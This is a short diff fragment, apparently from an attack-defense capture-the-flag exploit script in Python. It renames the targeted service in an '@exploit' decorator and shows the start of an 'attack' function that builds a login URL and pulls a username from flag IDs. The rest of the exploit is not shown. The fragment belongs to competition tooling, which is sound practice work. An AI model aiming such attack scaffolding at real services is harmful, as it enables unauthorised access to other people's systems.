@@ -23,7 +23,7 @@ import json
 import requests
 
 
-@exploit(service="foobar")
+@exploit(service="wish")
 def attack(target: str, flag_ids: str):
     url = f"http://{target}:5000/login"
     username = json.loads(flag_ids)["username"]
